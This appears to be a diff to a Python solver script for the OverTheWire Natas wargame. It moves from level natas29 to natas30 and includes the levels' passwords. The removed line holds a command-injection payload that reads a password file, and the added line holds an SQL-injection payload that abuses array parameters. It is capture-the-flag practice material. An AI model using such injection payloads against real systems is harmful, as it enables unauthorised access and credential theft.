@@ -1,8 +1,8 @@
 import sys
 import requests as req
 
-username = "natas29"
-password = "pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno"
+username = "natas30"
+password = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"
 url = "http://%s.natas.labs.overthewire.org/" % username
 
 s = req.session()
@@ -16,6 +16,7 @@ def post(s, data):
 	return r
 
 if __name__ == "__main__":
-	data = {"file": "| cat /etc/nata*_webpass/nata*30 \0"}
+	data = {"username": ["natas31"], "password": ["'' OR TRUE", 2]}
 	r = post(s, data)
 	print(r.text)
+	print(r.request.body)
